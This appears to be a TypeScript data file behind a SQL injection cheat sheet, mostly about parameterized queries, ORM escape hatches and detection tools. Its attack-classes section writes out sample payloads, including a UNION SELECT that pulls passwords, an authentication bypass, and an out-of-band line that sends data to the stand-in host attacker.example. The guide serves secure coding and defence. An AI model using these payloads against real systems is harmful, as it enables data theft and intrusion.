import type { CheatSheetData } from "./types";

const sqlInjection: CheatSheetData = {
  title: "The Ultimate SQL Injection Cheat Sheet",
  subtitle: "Attack classes · parameterization · ORM pitfalls · detection · production toolbelt",
  sections: [
    {
      title: "Core Concepts & Terms",
      color: "violet",
      rows: [
        { term: "SQL injection", desc: "Untrusted input is concatenated into a query string and changes its logic", code: "query = \"SELECT * FROM users WHERE name = '\" + name + \"'\"\n# name = \"x' OR '1'='1\" rewrites the WHERE clause" },
        { term: "Root cause", desc: "Mixing code (the query) and data (user input) in one string", code: "Data should never be parsed as code\nParameterization keeps them separate channels" },
        { term: "Parameterized query", desc: "Placeholders sent separately from the SQL text; the driver never lets data become syntax", code: "cur.execute(\"SELECT * FROM users WHERE name = %s\", (name,))" },
        { term: "Prepared statement", desc: "DB parses/plans the query once with placeholders, then binds values on each execution", code: "PREPARE stmt FROM 'SELECT * FROM users WHERE id = ?'\nEXECUTE stmt USING @id" },
        { term: "Sink", desc: "Any point where a string reaches a SQL execution call", code: "cursor.execute(raw_sql)\ndb.raw(query_string)" },
        { term: "Source", desc: "Any untrusted input: query params, form fields, headers, cookies, even other DB rows", code: "request.args.get('id')\nrequest.json['name']" },
        { term: "Least privilege DB account", desc: "App's DB user should not have DROP/ALTER/superuser rights it never needs", code: "GRANT SELECT, INSERT, UPDATE ON app.* TO 'app_user'\n-- no DROP, no GRANT OPTION" },
      ],
    },
    {
      title: "Attack Classes",
      color: "blue",
      rows: [
        { term: "Union-based (in-band)", desc: "Attacker appends a UNION SELECT to pull extra columns/tables into the visible response", code: "' UNION SELECT username, password FROM users -- " },
        { term: "Error-based (in-band)", desc: "Forces DB errors that leak schema/data through verbose error messages", code: "' AND extractvalue(1, concat(0x7e, version())) -- " },
        { term: "Boolean-based blind", desc: "No data returned directly; attacker infers truth from page behavior differing true vs false", code: "' AND 1=1 -- (page normal)\n' AND 1=2 -- (page differs)" },
        { term: "Time-based blind", desc: "Injects a delay function; response timing reveals whether a condition was true", code: "'; SELECT pg_sleep(5) WHERE 1=1 -- " },
        { term: "Out-of-band", desc: "Exfiltrates data via a side channel (DNS, HTTP) when in-band responses are fully suppressed", code: "'; EXEC master..xp_dirtree\n'\\\\attacker.example\\a' -- " },
        { term: "Second-order injection", desc: "Payload is stored safely first, then later concatenated unsafely into a different query", code: "Stored: username = \"admin'--\"\nLater: \"SELECT * FROM t WHERE u='\"+username+\"'\"" },
        { term: "NoSQL injection (related class)", desc: "Same root cause, different query language — operator injection in MongoDB-style queries", code: "{ \"username\": { \"$ne\": null } }  // bypasses auth check" },
      ],
    },
    {
      title: "The Fix: Parameterization",
      color: "emerald",
      rows: [
        { term: "psycopg2 (Python/Postgres)", desc: "Pass a tuple of params; never use percent-format or f-strings for SQL text", code: "cur.execute(\"SELECT * FROM t WHERE id = %s\", (user_id,))" },
        { term: "SQLAlchemy Core", desc: "Bound parameters via text() with named placeholders, or the query builder", code: "conn.execute(text(\"SELECT * FROM t WHERE id = :id\"), {\"id\": user_id})" },
        { term: "SQLAlchemy ORM (safe by default)", desc: "Filter expressions compile to bound parameters automatically", code: "session.query(User).filter(User.id == user_id).first()" },
        { term: "Node / node-postgres", desc: "Numbered placeholders bound at execution time", code: "client.query('SELECT * FROM t WHERE id = $1', [userId])" },
        { term: "Java / JDBC", desc: "PreparedStatement with ? placeholders, never Statement + string concat", code: "PreparedStatement ps = conn.prepareStatement(\n  \"SELECT * FROM t WHERE id = ?\");\nps.setInt(1, userId);" },
        { term: "Stored procedures (done right)", desc: "Safe only if the procedure itself uses parameters internally, not dynamic SQL", code: "CREATE PROCEDURE get_user(IN uid INT)\nBEGIN SELECT * FROM users WHERE id = uid; END" },
        { term: "Stored procedures (done wrong)", desc: "Still vulnerable if the procedure builds a string and EXECUTEs it", code: "-- BROKEN: still concatenates internally\nSET @q = CONCAT('SELECT * FROM t WHERE id=', uid);\nPREPARE s FROM @q; EXECUTE s;" },
      ],
    },
    {
      title: "ORM & Defense-in-Depth",
      color: "amber",
      rows: [
        { term: "Django ORM raw() escape hatch", desc: "Still vulnerable if you interpolate instead of using params argument", code: "User.objects.raw(\n  'SELECT * FROM t WHERE name = %s', [name])  # safe\nUser.objects.raw(f'... WHERE name = {name}')  # UNSAFE" },
        { term: "Sequelize raw query escape hatch", desc: "Use replacements, never string templates", code: "sequelize.query('SELECT * FROM t WHERE id = :id',\n  { replacements: { id }, type: QueryTypes.SELECT })" },
        { term: "Input validation / allowlisting", desc: "Defense-in-depth only — reject obviously malformed input, but never a substitute for parameterization", code: "if not re.fullmatch(r'[a-zA-Z0-9_]{1,32}', column_name): reject()" },
        { term: "Dynamic identifiers (table/column names)", desc: "Can't be parameterized — must be validated against a strict allowlist", code: "ALLOWED_COLUMNS = {'id', 'name', 'created_at'}\nif col not in ALLOWED_COLUMNS: reject()" },
        { term: "WAF (web application firewall)", desc: "Pattern-matches known payloads at the edge — a safety net, not a fix", code: "Blocks obvious ' OR 1=1 patterns\nBypassable via encoding/obfuscation" },
        { term: "ORM query builder over raw()", desc: "Prefer the builder API in day-to-day code; reserve raw SQL for reviewed, parameterized edge cases", code: "# Prefer: Model.objects.filter(...)\n# Over: Model.objects.raw(f'...')" },
      ],
    },
    {
      title: "Pitfalls & Gotchas",
      color: "rose",
      rows: [
        { term: "f-string / percent-format SQL", desc: "The single most common real-world SQLi root cause in Python code today", code: "# NEVER:\nquery = f\"SELECT * FROM t WHERE id = {user_id}\"" },
        { term: "'It's just an internal admin tool'", desc: "Internal tools get breached too — same rules apply regardless of audience", code: "Internal != trusted input\nStill parameterize" },
        { term: "LIKE clause wildcard injection", desc: "Percent/underscore in user input change LIKE matching even when parameterized", code: "cur.execute(\"... WHERE name LIKE %s\", (f\"%{term}%\",))\n# escape percent and underscore in the term if literal match intended" },
        { term: "ORDER BY / LIMIT injection", desc: "Can't bind identifiers as parameters — must validate against an allowlist", code: "ALLOWED_SORT = {'name', 'created_at'}\ncol = col if col in ALLOWED_SORT else 'id'" },
        { term: "Trusting client-side validation only", desc: "Client-side checks are UX, not security — always re-validate server-side", code: "JS regex on a form field stops nothing;\nan attacker calls the API directly" },
        { term: "Overly broad DB grants", desc: "A successful injection with a superuser DB account escalates to full compromise", code: "Never run the app as postgres/root\nCreate a scoped app_user role" },
        { term: "Blind trust in an ORM", desc: "ORMs prevent injection only when you use their parameterized API, not their raw escape hatches", code: "Audit every .raw(), .extra(), text() call\nin the codebase" },
      ],
    },
    {
      title: "Production Toolbelt",
      color: "cyan",
      rows: [
        { term: "sqlmap", desc: "Automated SQLi detection and exploitation tool for authorized testing", code: "sqlmap -u \"https://staging.example/item?id=1\" --batch" },
        { term: "Static analysis (Bandit, Semgrep)", desc: "CI-time detection of string-built SQL and raw() calls", code: "semgrep --config p/sql-injection ." },
        { term: "Parameterization lint rule", desc: "Grep-based CI gate as a cheap first layer before full static analysis", code: "grep -rn \"execute(f'\\|execute(\\\"%\" src/ && exit 1" },
        { term: "Least-privilege migration", desc: "Separate roles: migration runner (DDL) vs application (DML only)", code: "app_user: SELECT, INSERT, UPDATE, DELETE\nmigrator: also CREATE, ALTER, DROP" },
        { term: "Query logging with bound params", desc: "Log parameterized query text and params separately for safe auditing", code: "logger.info(\"query\", sql=stmt, params=redact(params))" },
        { term: "Penetration testing cadence", desc: "Regular authorized testing (internal or third-party) covering all input surfaces", code: "Include API params, headers, cookies,\nfile upload metadata, GraphQL args" },
        { term: "OWASP reference", desc: "See the OWASP Top 10 skill — SQLi falls under A03:2021-Injection", code: "Cross-reference: OWASP Top 10 skill" },
      ],
    },
  ],
};

export default sqlInjection;
